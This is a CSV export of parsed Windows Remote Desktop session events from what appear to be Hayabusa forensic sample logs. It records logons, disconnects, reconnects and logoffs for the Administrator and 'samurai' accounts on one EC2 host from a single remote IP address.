2294,2294,2024-11-22 21:54:40.2420186,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2295,2295,2024-11-22 21:54:40.2454371,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2296,2296,2024-11-22 21:55:10.4399872,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,1200,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2297,2297,2024-11-22 22:30:38.9797626,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,552,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2298,2298,2024-11-22 22:36:22.6415342,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2299,2299,2024-11-22 22:36:22.6513945,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2300,2300,2024-11-22 22:36:23.6347664,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2301,2301,2024-11-22 22:36:24.3855711,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2302,2302,2024-11-22 22:37:00.9961072,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: No additional information is available (i.e. the user has closed RDP window),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""0""}}}"
2303,2303,2024-11-22 22:37:06.7069807,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2304,2304,2024-11-22 22:37:46.1843016,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: The client's connection was replaced by another connection (i.e. a user reconnected to a previous RDP session),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""5""}}}"
2305,2305,2024-11-22 22:37:46.9488957,25,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session reconnection succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2306,2306,2024-11-22 22:38:40.3691078,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3480,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\Administrator,,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2""}}}"
2307,2307,2024-11-22 22:38:40.8849802,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 2,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""2"",""Reason"":""12""}}}"
2308,2308,2024-11-22 22:38:40.9881075,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 2,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""2"",""Address"":""219.100.37.234""}}}"
2309,2309,2024-11-22 22:39:20.2253044,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2310,2310,2024-11-22 22:39:20.2406788,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,600,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2311,2311,2024-11-22 22:39:20.5052651,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,3592,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2312,2312,2024-11-22 22:39:20.9199133,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2313,2313,2024-11-22 22:45:55.4618784,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\Administrator,,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3""}}}"
2314,2314,2024-11-22 22:45:55.8932403,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 3,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""3"",""Reason"":""12""}}}"
2315,2315,2024-11-22 22:45:56.0767078,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 3,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""3"",""Address"":""219.100.37.234""}}}"
2316,2316,2024-11-22 22:47:27.6393641,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2317,2317,2024-11-22 22:47:27.6455200,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2318,2318,2024-11-22 22:47:31.5487571,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2319,2319,2024-11-22 22:47:31.9642288,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2320,2320,2024-11-22 22:48:00.9471093,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: No additional information is available (i.e. the user has closed RDP window),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""0""}}}"
2321,2321,2024-11-22 22:48:01.8423921,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2322,2322,2024-11-22 22:48:30.4664298,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: The client's connection was replaced by another connection (i.e. a user reconnected to a previous RDP session),,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""5""}}}"
2323,2323,2024-11-22 22:48:31.3125540,25,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session reconnection succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2324,2324,2024-11-22 22:48:45.9554792,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\samurai,,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4""}}}"
2325,2325,2024-11-22 22:48:46.4906255,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 4,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""4"",""Reason"":""12""}}}"
2326,2326,2024-11-22 22:48:46.5874467,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,984,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 4,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""4"",""Address"":""219.100.37.234""}}}"
2327,2327,2024-11-22 22:48:59.8480309,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5""}}}"
2328,2328,2024-11-22 22:48:59.8851123,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5""}}}"
2329,2329,2024-11-22 22:49:00.1688952,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 5,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5"",""Address"":""219.100.37.234""}}}"
2330,2330,2024-11-22 22:49:00.4402605,22,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,4048,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Shell start notification received,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5"",""Address"":""219.100.37.234""}}}"
2331,2331,2024-11-22 22:49:16.7320309,23,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logoff succeeded,EC2AMAZ-3NFFVNI\samurai,,Session ID: 5,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5""}}}"
2332,2332,2024-11-22 22:49:16.9168982,40,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,"Session (PayloadData1) has been disconnected, reason code (PayloadData2)",,,Session: 5,Reason: The disconnection was initiated by the user logging off his or her session on the server,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""Session"":""5"",""Reason"":""12""}}}"
2333,2333,2024-11-22 22:49:17.0273432,24,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2060,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session has been disconnected,EC2AMAZ-3NFFVNI\samurai,219.100.37.234,Session ID: 5,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\samurai"",""SessionID"":""5"",""Address"":""219.100.37.234""}}}"
2334,2334,2024-11-22 22:50:25.1962381,41,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6""}}}"
2335,2335,2024-11-22 22:50:25.2172990,42,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,5060,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6""}}}"
2336,2336,2024-11-22 22:50:25.4450751,21,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,896,2428,EC2AMAZ-3NFFVNI,0,S-1-5-18,Remote Desktop Services: Session logon succeeded,EC2AMAZ-3NFFVNI\Administrator,219.100.37.234,Session ID: 6,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""User"":""EC2AMAZ-3NFFVNI\\Administrator"",""SessionID"":""6"",""Address"":""219.100.37.234""}}}"
